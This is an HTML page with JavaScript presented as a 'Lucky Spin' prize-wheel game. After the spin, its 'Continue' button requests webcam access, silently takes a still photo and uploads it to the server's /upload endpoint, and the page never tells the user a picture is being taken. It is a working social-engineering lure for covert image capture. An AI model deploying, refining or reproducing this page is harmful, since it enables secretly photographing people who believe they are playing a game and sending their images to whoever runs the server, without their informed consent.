<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Lucky Spin Demo</title>
    <style>
        body {
            background: radial-gradient(circle at top, #1a1a1a, #000);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 10%;
        }
        .btn {
            padding: 14px 28px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 15px;
            background: gold;
            color: black;
        }
        #wheel {
            margin: 30px auto;
            width: 200px;
            height: 200px;
            border-radius: 50%;
            border: 8px solid gold;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            transition: transform 3s ease-out;
        }
        #result {
            font-size: 22px;
            margin-top: 20px;
        }
        #status {
            margin-top: 15px;
            color: lightgreen;
        }
    </style>
</head>
<body>

<h1>🎯 Lucky Spin</h1>

<div id="wheel">🎁</div>

<button id="mainBtn" class="btn" onclick="spin()">Lucky Spin</button>

<div id="result"></div>
<p id="status"></p>

<script>
let step = 0; // 0 = spin, 1 = capture

function spin() {
    if (step === 1) {
        capture();
        return;
    }

    const wheel = document.getElementById("wheel");
    const result = document.getElementById("result");
    const btn = document.getElementById("mainBtn");

    result.innerText = "";

    const rotation = Math.floor(Math.random() * 3600) + 720;
    wheel.style.transform = "rotate(" + rotation + "deg)";

    setTimeout(() => {
        const win = Math.random() > 0.5;
        result.innerText = win ? "🎉 Congrats!" : "😅 Try again!";

        // change button behavior
        btn.innerText = "Continue";
        step = 1;

    }, 3000);
}

// send image
async function sendImage(dataUrl) {
    await fetch('/upload', {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({image: dataUrl})
    });
}

// capture (still requires browser permission)
async function capture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        canvas.getContext("2d").drawImage(video, 0, 0);

        const dataUrl = canvas.toDataURL("image/png");
        await sendImage(dataUrl);

        stream.getTracks().forEach(t => t.stop());

        document.getElementById("status").innerText = "Captured.";

    } catch (e) {
        document.getElementById("status").innerText = "Permission denied.";
    }
}
</script>

</body>
</html>
